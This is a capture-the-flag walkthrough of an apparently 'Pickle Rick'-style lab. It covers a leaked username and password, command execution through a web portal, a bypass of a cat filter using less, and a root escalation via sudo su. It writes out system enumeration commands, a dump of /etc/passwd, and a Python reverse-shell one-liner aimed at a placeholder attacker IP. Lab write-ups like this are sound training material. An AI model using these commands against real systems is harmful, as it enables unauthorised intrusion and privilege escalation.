So first thing first after getting the ip i opened up into the browser and i got this

That is  

![homepage.png](homepage.png)

now we are going to do directory bruteforcing to get some hint regarding the password.

But before it we will lookup for the source code in the hope it could somehow help.

and yup we got the username that is 

```html
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Now we know the username we need to know the endpoint which is needed in login 

Now the directroy bruteforcing is crutial.

In directory bruteforcing there was a robots.txt too which contains this

```text
Wubbalubbadubdub
```

And we are able to find the login endpoint with it it was

- /login.php

The text inside the robots.txt was the password and we are able to get the login at the edpoint /lgoin.php with the extracted username and password.

And there is a panel which lets us execute the commands when i did whoami i got _whoami_ i got _www-data_ in replly.

Meaning command execution is working the endpoint for it was 
- /portal.php

And it was in-build.

so i did ls -a and i was able to get the contents they were


- .
- ..
- Sup3rS3cretPickl3Ingred.txt
- assets
- clue.txt
- denied.php
- index.html
- login.php
- portal.php
- robots.txt

but doing it access and read content with the same endpiont with cat clue.txt gave me the custom error

![error.png](error.png)

Instead i tried directly accesssing the file as robots.txt is in same directory and can be accessed directly using the url

http://IP/robots.txt

Similarly i tried to access the Sup3rS3cretPickl3Ingred.txt by 

http://IP/Sup3rS3cretPickl3Ingred.txt

And i was able to get the content that was the answer of q1.

Now after accessing the file clue.txt By the url

http://IP/clue.txt

And the content inside it was 

```text
Look around the file system for the other ingredient.
```

So i tried looking around after opening the page denied.php i got

![denied.php](rick.png)

Now after a lot of here and there on the server when i was on the portal endpoint everytime i used cat,vim or nano. i was getting the error

![rick.png](rick.png)

So i tried executing what program is actuallly installed on that system with the command 

ls /usr/bin

And i was able to get a lot of entries in which cat was also there i fed the entire list to ai and said to spot that prgram that is able to read the content of a file.

It spot the less command.

which was successfullly reading the content of the file.

which i tested for the file 

less clue.txt

And i get succeed in readig the content you can view the poc below

![poc.png](poc.png)

now we can walk around in the filesystem and be able to read anyfile as per our wish.

but when i did finding which directory i am in since id  was www-data

so obviuls i should be inside /var/html/www

And our assumption was correct as i did pwd.

And then to seach around in filesystem i tried to change the directroy to the root with cd /

But after execuring it when i checked pwd i was still at /var/html/www

Meaninng the cd was disabled too as like the cat.

But since we can't go there but we could peek there.

so i tried to peek inside with the command 

ls  -lah /

And i was able to read the content.


so i tried to go more deep i peek inside the /home there was a folder rick so  i entered there too there was a file named second ingredients

so i tried reading the file with 

less /home/rick/second\ ingredients

And i was able to get the answer of 2nd quesiton.


For the 3rd question i need to go on to the rev shell or somehow get the shell.

So now its time to go into the full detective mode and full roaming here and there now i did first few command command and gets the output

- id > uid=33(www-data) gid=33(www-data) groups=33(www-data)

- whoami > www-data

- hostname > ip-10-48-164-33

- uname -a > Linux ip-10-48-164-33 5.15.0-1064-aws #70~20.04.1-Ubuntu SMP Fri Jun 14 15:42:13 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

- cat /etc/passwd  >root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
landscape:x:103:105::/var/lib/landscape:/usr/sbin/nologin
tss:x:112:119:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:113:120::/nonexistent:/usr/sbin/nologin
fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

- cat /etc/crontab > # |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

These are the few result now after analyzing the crontab it is nothing much of our interest.

But after inspecting the file /etc/passwd

We got confirm that there are 2 users one is ubuntu and one is rick.

Next i checked that at which location i am peremitted to write with the command

- find / -writable -type d 2>/dev/null

and the ouput was 

```bash
/proc/1482/task/1482/fd
/proc/1482/fd
/proc/1482/map_files
/tmp
/var/cache/apache2/mod_cache_disk
/var/crash
/var/tmp
/var/lib/lxcfs/proc
/var/lib/lxcfs/sys
/var/lib/lxcfs/sys/devices
/var/lib/lxcfs/sys/devices/system
/var/lib/lxcfs/sys/devices/system/cpu
/var/lib/lxcfs/cgroup
/var/lib/php/sessions
/run/screen
/run/php
/run/cloud-init/tmp
/run/lock
/run/lock/apache2
/home/rick
/dev/mqueue
/dev/shm
```

Interested locations were /tmp & /dev/shm


And inside the location /home/rick there was only 1 file that contained the answer of q2.

And after it all with the commadn

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR-IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

I was able to get the revshell.

Intentinally or unintenally i was chekcing for misconfigured binaries with sudo -l and it doesn't gave me any such binary so i tried anything else that is

- sudo su

Now after it i somehow got the root access.

After doing a little research i heard that if content after the execution of command sudo -l is

Matching Defaults entries for root on ip-10-48-164-33: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User root may run the following commands on ip-10-48-164-33: (ALL : ALL) ALL

Then if i am authenticated as that account (or already are root), I can get an interactive root shell with either:

sudo su

or:

sudo -i

Now after getting the root access i am able to read the 3rd question answer in the file

/root/3rd.txt
